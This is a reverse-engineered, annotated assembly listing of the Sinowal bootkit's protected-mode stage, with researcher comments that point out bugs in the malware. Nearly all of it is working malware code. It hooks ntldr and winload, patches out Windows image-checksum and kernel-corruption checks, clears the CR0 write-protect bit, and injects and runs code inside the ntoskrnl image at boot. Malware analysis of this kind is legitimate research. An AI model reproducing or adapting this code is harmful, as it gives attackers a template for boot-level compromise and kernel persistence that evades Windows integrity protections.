
;  Sinowal Bootkit [Protected Mode]

;  reverse engineering done by Peter Kleissner

[bits 32]


; this code is called by ntldr or bootmgr, it is 32 bit protected mode code, located at:
;     Protected Mode:             3/4 of first MB
;     Protected Mode + Paging:    at the end of ntoskrnl image

; Windows XP functions:
;    - Entry_Point_Windows_XP

; Windows Vista only functions:
;    - Entry_Point_OS_Vista
;    - Hook_WinloadExe
;    - Windows_Vista_NtKernel_Hook_Code

; OS independent functions:
;    - Find_Ntoskrnl_Code_Pattern
;    - Ntoskrnl_Hook_Code
;    - Patch_Kernel_Code
;    - Relocate_Me_Code
;    - Obfuscation_Function
;    - Obfuscation_Return




Entry_Point_Windows_XP:

sub [esp],dword 6                                                               ; return and restore the original code on the original address (BUGFIX FOR SINOWAL)
call dword Obfuscation_Function

; overwrite Windows (OSLOADER) return code with Relocate_Me_Code, nops, to remove some instructions that would fail/crash
;   00422a75:  cmp byte ptr ds:0x43aef8, 0x00 ; 803df8ae430000
;   00422a7c:  jz .+0x00000007           ; 7407
;   00422a7e:  xor esi, esi              ; 33f6                => set esi to zero
; becomes the code which was overwritten with the hook call:
;   00422a75:  mov esi, eax              ; 8bf0                = set esi to eax which is (normally always) zero
;   00422a77:  test esi, esi             ; 85f6
;   00422a79:  jz .+0x00000021           ; 7421                thus this jump will always be taken
mov ecx,6                                                                       ; copy 6 bytes that will be overwritten
; ************ BUG 1 IN SINOWAL ************
; THE DO NOT RESTORE THE 6 BYTES AT THE
; ORIGINAL ADDRESS SO IT WILL FAIL WITH
; WINDOWS 2003 KERNEL
; BECAUSE THE 6 BYTES CONTAIN A RELATIVE
; JUMP INSTRUCTION
; ************ BUG 1 IN SINOWAL ************
rep movsb
sub esi,6                                                                       ; to Relocate_Me_Code


; scan OS Loader for the signature (we need to copy some system values from runtime ntldr)    [same as in previous Sinowal version]
;   + C7 46 34 00 40  ...   A1
;     ntldr.19A44h          ntldr.19A51h
;			memory.0x00415915     memory.0x00415921
mov edi,[esp+0x2c]                                                              ; return eip
and edi,0xfff00000                                                              ; get ntldr module base address(= 0x00400000) to scan from
mov al,0C7h

Search_Ntldr_Signature:
scasb
jnz Search_Ntldr_Signature
cmp dword [edi],0x40003446
jnz Search_Ntldr_Signature
Search_Ntldr_Signature_2:
mov al,0A1h                                                                     ; start scanning for second signature
scasb
jnz Search_Ntldr_Signature_2

; get Ntoskrnl Image Address
mov eax,[edi]                                                                   ; 0x004682c4
mov eax,[eax]                                                                   ; why not?
mov eax,[eax]                                                                   ; [80087000] = 0x8008a090 (some system memory table)
mov edi,[eax+0x18]                                                              ; get base address of ntoskrnl (= 0x804d7000 for XP)
mov ecx,[edi+0x3c]                                                              ; PE Header (skip DOS Header/Stub)
mov ecx,[ecx+edi+0x50]                                                          ; -> SizeOfImage
call dword Find_Ntoskrnl_Code_Pattern
jnz Exit_Entry_Point_Windows_XP                                                 ; not found? -> exit

; patching the kernel code..

; remember original jump address
mov edx,[ebx]                                                                   ; edx = [signature], must be some address
lea edx,[ebx+edx+4]                                                             ; signature address + relative jump address + 4 = return address
mov [esi+10],edx                                                                ; store return address to temporary code (PMwPC_Address)

; Windows XP, Server 2003: copy 2 KB at end of ntoskrnl
add edi,ecx                                                                     ; +SizeOfImage (edi still contains ntoskrnl base pointer)
jmp Patch_Kernel_Code


Patch_Kernel_Code_Vista:
; ebx = some address 
; ecx = size of image of nt kernel
; edi = nt kernel image base address

; remember original jump address
mov edx,[ebx]                                                                   ; edx = [signature], must be some address
lea edx,[ebx+edx+4]                                                             ; signature address + relative jump address + 4 = return address
mov [esi+10],edx                                                                ; store return address to temporary code (PMwPC_Address)

add edi,2048
jmp Patch_Kernel_Code

; find a section with enough free space at its end
mov eax,edi
add edi,[edi + 3Ch]                                                             ; skip DOS Header/Stub
movzx ecx,word [edi + 6]                                                        ; NumberOfSections
add edi,24 + 216 + 8                                                            ; -> first Section Table

Section_Table_Entry:
cmp [edi + 16],dword 0                                                          ; SizeOfRawData = 0?
je Section_Table_Entry_Next
test [edi + 16],dword 00000FFFh                                                 ; 4 KB alignment?
jz Section_Table_Entry_Next
test [edi + 16],dword 00000FFFh                                                 ; 4 KB alignment?
jz Section_Table_Entry_Next
test [edi + 12],dword 00000FFFh                                                 ; 4 KB alignment of section?
jnz Section_Table_Entry_Next                                                    ; if not we can't use it
test [edi + 16],dword 000007FFh                                                 ; 2 KB, 11111111111, if zero this means 2 KB are empty!
jz Section_Table_Entry_Found
test [edi + 16],dword 00000800h                                                 ; 2 KB, 11111111111, if zero this means 2 KB are empty!
jz Section_Table_Entry_Found

Section_Table_Entry_Next:
add edi,40                                                                      ; + sizeof(Section Table Entry)
loop Section_Table_Entry

jmp Exit_Entry_Point_Windows_XP                                                 ; no free section available, exit

Section_Table_Entry_Found:
add eax,[edi + 12]                                                              ; seek to VirtualAddress of section
add eax,[edi + 8]                                                               ; + VirtualSize
mov edi,eax


; patch the NT Kernel with Kernel Code  =)
Patch_Kernel_Code:                                                              ; injects the kernel code to the given address
add edi,00000FFFh                                                               ; get end of page
and edi,0FFFFF000h                                                              ; page base address
sub edi,2048;Total_End_of_Binary - Relocate_Me_Code                                  ; from the end

; copy PMwPC to end of nt kernel (in the last page of the kernel)
;push edi
;push ecx
mov ecx,Total_End_of_Binary - Relocate_Me_Code                                  ; size of further code
push edi
rep movsb
pop edi
;pop ecx
;pop eax

%if 0 = 1
; recalculate ntoskrnl checksum :)
pushad
push dword ecx  ; Size of Image
push dword eax  ; Image Pointer
call CalcPESum
popad
%endif

; patch ntoskrnl (modify the call instruction to jump to our relocated Kernel Code)
add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code                                   ; -> absolute Kernel Code entry point address
sub edi,ebx                                                                     ; - address of call
sub edi,4                                                                       ; -4 because of call instruction, relative call
mov [ebx],edi                                                                   ; store address

Exit_Entry_Point_Windows_XP:
jmp dword Obfuscation_Return                                                    ; return from ntldr hook code (see spaghetti, spaghetti notice from above)




Entry_Point_OS_Vista:

; ************ BUG 2 IN SINOWAL ************
; THE ADDRESS IS WRONG STORED, -4 BYTES SO
; IT WILL JUMP INTO THE PREVIOUS JUMP ABOVE
; LUCKILY FOR THEM IT'S JUST dec esi
; ************ BUG 2 IN SINOWAL ************
pushad
push es                                                                         ; will be temporarily changed
push ds

; we need to set correct segment register (this is also why this function was far called)
;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
;   gdtr:base=0x0001f000, limit=0x7f
;   idtr:base=0x0001f080, limit=0x7ff
mov eax,0x30                                                                    ; set to 30h, Data Segment
mov es,ax
mov ds,ax

; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
mov edi,00400000h                                                               ; OS Loader base
mov ecx,960 * 1024                                                              ; 960 KB (typical winload.exe size), max. size; this should be removed by SizeOfImage
call dword Get_Current_EIP_2
Get_Current_EIP_2:
pop esi
add esi,Relocate_Me_Code - Get_Current_EIP_2
call dword Hook_WinloadExe

pop ds                                                                          ; restore them
pop es
popad

retf                                                                            ; far return to get original cs register




Windows_Vista_NtKernel_Hook_Code:

; 1. called by OSLOADER resisting in bootmgr

call dword Obfuscation_Function

; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
movsx eax,byte [esi+4]                                                          ; esi = Relocate_Me_Code, get jump offset of original code from the backup
dec eax                                                                         ; -1 because call [address] used 1 more byte
add [esp+0x2c],eax                                                              ; return eip (2Ch = pushad + pushfd + push eax)

; get caller's eax register
lea edx,[edi+0x6]                                                               ; original return address + 6       WHY ?
movzx eax,byte [esi+0x1]                                                        ; register (eax, 43) of compare opcode
not al                                                                          ; = BCh
and al,00000111b                                                                ; = 04h
add al,2                                                                        ; = 06h
mov edi,[esp+eax*4]                                                             ; stack + 6*4  =>  get ebx register..

; valid PE Image?
cmp dword [edi],'PE'                                                            ; verify PE Signature
jnz Exit_Entry_Point_Windows_Vista
cmp word [edi+0x18],010Bh                                                       ; 010Bh, Magic Number (PE32)
jnz Exit_Entry_Point_Windows_Vista

; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
mov ecx,[edi+0x50]                                                              ; SizeOfImage
and edi,0FFFFF000h                                                              ; page base address of PE Image
call dword Hook_WinloadExe
jz Exit_Entry_Point_Windows_Vista

; from now on the code for XP and Vista is the same
; if previous jz didn't exited we can look for ntoskrnl pattern

; find the signature in ntoskrnl and patch the code
call Find_Ntoskrnl_Code_Pattern
jz Patch_Kernel_Code_Vista                                                      ; if found, patch!

Exit_Entry_Point_Windows_Vista:
jmp Obfuscation_Return                                                          ; return to Windows




Hook_WinloadExe:

; Input
;   esi = address of Relocate_Me_Code
;   edi = address of memory to scan
;   ecx = bytes to scan

push ecx
push edi

; scan winload for some jump offset
;   + 3B ?? 58 74 ?? C7
;   bootmgr/OS Loader   +22E90h
;   winload.exe         +2024Fh  +212A0h (differs with OS version)
; patch applied: winload.exe will be hooked
;   0041e8c0:  cmp eax, dword ptr ds:[ebx+0x58]         ; 3b4358            ->      call [address]
;   0041e8c3:  jz .+0x0000000c                          ; 740c              ->
;   0041e8c5:  mov dword ptr ss:[ebp+0x8], 0xc0000221   ; c74508210200c0    (STATUS_IMAGE_CHECKSUM_MISMATCH)
Search_Unknown_Signature:
mov al,0x3b
repne scasb
jnz Hook_WinloadExe_Exit                                                        ; if not found exit
cmp word [edi+0x1],0x7458
jnz Search_Unknown_Signature
cmp byte [edi+0x4],0xC7
jnz Search_Unknown_Signature

; backup 6 bytes to overwrite them with custom code
dec edi                                                                         ; -1 to get to start of signature
mov eax,[edi]                                                                   ; copy 4 bytes
mov [esi],eax
mov ax,[edi+4]                                                                  ; copy 2 bytes
mov [esi+4],ax

; store new code: FF 15 + address  (call hook)
mov ax,0x15FF                                                                   ; FF 15, opcodes of call [address]
stosw                                                                           ; store the bytes (modify code)
lea eax,[esi - (Relocate_Me_Code - Windows_Vista_NtKernel_Hook_Code)]           ; get offset of hook code
mov [es:esi+6],eax                                                              ; Hook_Address = &Windows_Vista_NtKernel_Hook_Code
lea eax,[esi+6]                                                                 ; get address of variable address, used for call [address]
stosd                                                                           ; store &Hook_Address

; restore (and store) register contents for searching the next signature
pop edi
pop ecx
push ecx
push edi

; scan winload for the code that puts ntoskrnl corrupt error status
;   + 8B F0 85 F6 ?? ?? and value 0C0000098h
; patch applied: STATUS_FILE_INVALID error code will be overwritten
;   0041f076:  lock test esi, esi        ; f085f6
;   0041f079:  jnz .+0x0000000a          ; 750a
;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
Search_Ntoskrnl_Error_Code:
mov al,0x8b
repne scasb
jnz Hook_WinloadExe_Exit
cmp dword [edi],0x75f685F0
jnz Search_Ntoskrnl_Error_Code
cmp dword [edi+0x6],0xC0000098                                                  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
jnz Search_Ntoskrnl_Error_Code
mov dword [edi+0x6],0x0                                                         ; heh no error xD   STATUS_SUCCESS

Hook_WinloadExe_Exit:
pop edi
pop ecx

ret




Find_Ntoskrnl_Code_Pattern:

; Input
;   ecx = SizeOfImage
;   edi = Image
; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
; return status zero flag = 1 found

push ecx
push edi

; scan ntoskrnl.exe for code patterns [+ for Vista]:
;   + 6A 4B/19 6A 19/4B /?? ?? ?? ?? 89/ ??/ ??/ ??/ ??/ ??/ ??/ E8
;     ntoskrnl.1CE87E0h
;			memory.0x80683ec9
Scan_Pattern_Ntoskrnl:
mov al,0x6a
repne scasb
jnz Find_Ntoskrnl_Code_Pattern_Exit
cmp dword [edi-0x1],0x196A4B6A
jz Signature_1_Found
cmp dword [edi-0x1],0x4B6A196A
jnz Scan_Pattern_Ntoskrnl                                                       ; if not equal => continue search
inc edi                                                                         ; weird signature
Signature_1_Found:
cmp byte [edi+0x3],0x89                                                         ; 2 possible valid signatures
jnz No_Extended_Signature
add edi,byte +0x6
No_Extended_Signature:
cmp byte [edi+0x3],0xe8
jnz Scan_Pattern_Ntoskrnl

; first pattern found, scan for next [same as in previous Sinowal version] signature:
;   + E8 ?? ?? ?? ?? 84 C0
;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
;			memory.0x80683ed8						memory.0x80683EDD
lea ebx,[edi+0x8]
xchg ebx,edi
mov al,0xe8
repne scasb
jnz Find_Ntoskrnl_Code_Pattern_Exit
cmp word [edi+0x4],0xc084
xchg ebx,edi
jnz Scan_Pattern_Ntoskrnl

Find_Ntoskrnl_Code_Pattern_Exit:
pop edi
pop ecx

ret




Relocate_Me_Code:
; 6 nops for overwriting instructions of hooked OSLOADER and ntoskrnl code
nop
nop
nop
nop
nop
nop

Hook_Address    dd  0     ; &Windows_Vista_NtKernel_Hook_Code
PMwPC_Address   dd  0     ; ntoskrnl hook original/return jump address, will be set at runtime




Ntoskrnl_Hook_Code:

; this is a small wrapper to the kernel code

; call caller..
push dword [esp+0x4]                                                            ; store argument 1 = 0x80087000, from nt!IoInitSystem
push eax                                                                        ; first call = Execute_Kernel_Code
push eax                                                                        ; second call = call to original address
call dword Obfuscation_Function

; set return obfuscation address to original address that was overwritten (forward the function)
mov eax,[esi+10]                                                                ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
mov [esp+0x2c],eax                                                              ; set return pointer (using the obfuscation return) to the original calling address

; remove hook by reassigning jump address
mov edi,[esp+0x38]                                                              ; edi => return eip from this hook call
sub eax,edi                                                                     ; original calling address - return eip to code (calculate relative original calling address)
mov [ss:edi-4],eax                                                              ; for every next call: do not call this bootkit

; set return eip of the forwarded function to Execute_Kernel_Code
lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]                          ; get address of Execute_Kernel_Code
mov [esp+0x30],eax                                                              ; and store it as return eip address

jmp short Obfuscation_Return


Execute_Kernel_Code:

; execute the Kernel Code (original hooked/forwarded initialization function returns here)
call Kernel_Code                                                                ; =)

ret 4                                                                           ; remove the pushed argument (as the original function would have done)




Obfuscation_Function:

; [stack + 0] = address to jump to
; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2

; Output:
; esi = pointer to Relocate_Me_Code
; edi = pointer to return code of Windows / Argument 2

; during execution all memory access is possible is cr0.wp cleared
; return by jumping to Obfuscation_Return

pushad                                                                          ; +32
pushfd                                                                          ; +4
cld

; clear cr0.Write Protect flag (to allow writing into read-only user pages)
mov eax,cr0
push eax
and eax,0FFFEFFFFh                                                              ; clear cr0.WP (bit 16), it is normally set in Windows
mov cr0,eax

; set parameters and call
xchg ebx,[esp+0x28]                                                             ; ebx = return eip
mov edi,[esp+0x2c]                                                              ; edi = Argument 2
call dword Get_Current_EIP_0
Get_Current_EIP_0:
pop esi                                                                         ; esi = eip
sub esi,Get_Current_EIP_0 - Relocate_Me_Code                                    ; set esi to Relocate_Me_Code absolute address
jmp ebx                                                                         ; jump

; restore cr0.wp
Obfuscation_Return:
pop eax
mov cr0,eax                                                                     ; everything done fine, restore it and give control back to Windows

popfd
popad
pop ebx                                                                         ; exchange the value back

ret                                                                             ; return to Windows

